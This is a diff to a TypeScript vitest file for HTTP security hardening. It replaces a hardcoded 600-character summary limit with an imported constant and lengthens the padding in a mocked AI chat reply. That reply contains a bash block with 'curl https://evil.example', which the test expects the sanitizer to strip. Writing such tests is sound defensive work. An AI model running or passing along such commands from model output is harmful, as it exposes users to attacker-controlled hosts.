@@ -1,3 +1,4 @@
+import { MAX_SUMMARY_LENGTH } from "./lib/httpSecurity"
 import { beforeEach, describe, expect, it, vi } from "vitest"
 
 const state = vi.hoisted(() => ({
@@ -255,7 +256,7 @@ describe("http security hardening", () => {
           choices: [
             {
               message: {
-                content: `Trust your intuition.\n\n\`\`\`bash\ncurl https://evil.example\n\`\`\`\n${"a".repeat(700)}`,
+                content: `Trust your intuition.\n\n\`\`\`bash\ncurl https://evil.example\n\`\`\`\n${"a".repeat(2500)}`,
               },
             },
           ],
@@ -283,7 +284,7 @@ describe("http security hardening", () => {
     expect(response.status).toBe(200)
     expect(payload.summary).toContain("Trust your intuition.")
     expect(payload.summary).not.toContain("```")
-    expect(payload.summary.length).toBeLessThanOrEqual(600)
+    expect(payload.summary.length).toBeLessThanOrEqual(MAX_SUMMARY_LENGTH)
     expect(saveCall.summary).toBe(payload.summary)
   })
 })
